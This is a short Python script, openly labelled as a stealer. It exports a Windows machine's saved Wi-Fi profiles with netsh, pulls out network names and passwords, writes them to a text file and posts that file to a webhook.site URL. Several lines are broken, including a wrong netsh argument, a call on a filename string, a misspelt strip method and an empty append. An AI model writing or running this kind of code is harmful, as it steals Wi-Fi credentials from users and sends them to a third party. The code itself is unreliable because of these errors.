
import subprocess
import os
import sys
import requests

#stealer url
url = 'https://webhook.site/b7918b2e-fb49-4927-b05b-ad42aab8c9c8'

#create a file
password_file = open('passwords.txt', "w")
password_file.write("Hello 5746428! Here are the requested details:\n\n")
password_file.close()

#Lists
wifi_files = []
wifi_name = []
wifi_password = []

#use python to execute a windows command
command = subprocess.run(["netsh", "wlan", "export", "profile",
  "key-clear"], capture_output=True).stdout.decode()

#Grab current directory
path = os.getcwd()

#Do the hacking
for filename in os.listdir(path):
 if filename.startswith("wifi") and filename(".xml"):
    wifi_files.append(filename)
    for i in wifi_files:
        with open(i, 'r') as f:
           for line in f.readlines():
              if 'name' in line:
                stripped = line.stripped()
                front = stripped[6:]
                back = front[:-7]
                wifi_name.append(back)
              if 'keyMaterial' in line:
                stripped = line.strip()
                front = stripped[13:]
                back = front[:-14]
                wifi_password.append()
    for x, y in zip(wifi_name, wifi_password):
     sys.stdout = open("passwords.txt", "a")
     print("SSID:"+x, "Password: "+y, sep='\n')
    sys.stdout.close()

#Send the hacked data
with open('passwords.txt', 'rb') as f:
    r = requests.post(url, data=f)